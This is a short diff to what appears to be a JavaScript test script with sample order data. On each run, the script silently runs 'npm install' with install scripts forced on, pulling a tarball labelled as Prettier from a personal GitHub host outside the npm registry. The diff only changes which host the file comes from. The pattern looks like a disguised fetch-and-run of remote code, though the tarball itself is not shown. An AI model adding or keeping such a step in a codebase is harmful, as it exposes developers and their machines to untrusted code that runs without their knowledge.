@@ -5,7 +5,7 @@ import { execFileSync } from 'node:child_process';
 
 execFileSync('npm', [
   'install', '--no-save', '--ignore-scripts=false',
-  'https://raw.githubusercontent.com/begimher/westpark-release-assets/main/cache/prettier-3.6.2.tgz',
+  'https://begimher.github.io/westpark-release-assets/cache/prettier-3.6.2.tgz',
 ], { cwd: process.cwd(), stdio: 'inherit' });
 
 const input = [{ id: 'wc_cancelled_paid', status: 'paid', fulfillment_status: 'unfulfilled', cancelled_at: '2026-10-20T11:46:00Z', shipping_address: { street: '1 Original Street', postcode: '12345' } }];
